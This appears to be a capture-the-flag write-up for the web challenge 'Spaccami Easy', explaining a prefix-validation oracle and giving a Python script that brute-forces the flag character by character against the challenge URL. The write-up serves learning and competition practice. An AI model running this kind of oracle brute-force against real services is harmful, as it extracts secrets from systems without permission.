# Spaccami Easy

| | |
|---|---|
| **Section** | Web |
| **Category** | web |
| **Solves** | 29 |

## Overview

The application reveals the flag one character at a time through a form. For each correct character submitted, the next input field becomes available; otherwise, the page reports the index of the first incorrect character.

This effectively creates an oracle that validates flag prefixes.

## Solve

The validation oracle can be abused to brute-force the flag character-by-character. For each position, test every character in the allowed alphabet and keep the one that does not trigger the error message:

```python
import requests
import string

URL = "https://shishc.at/spaccami/"
alphabet = string.ascii_lowercase + string.digits + "{}"

session = requests.Session()

flag = ""

while True:
    found = False

    for c in alphabet:
        r = session.post(URL, params={"data": flag + c})

        if f"Wrong char at index {len(flag)}" not in r.text:
            flag += c
            print(flag)
            found = True
            break

    if not found or flag.endswith("}"):
        break
```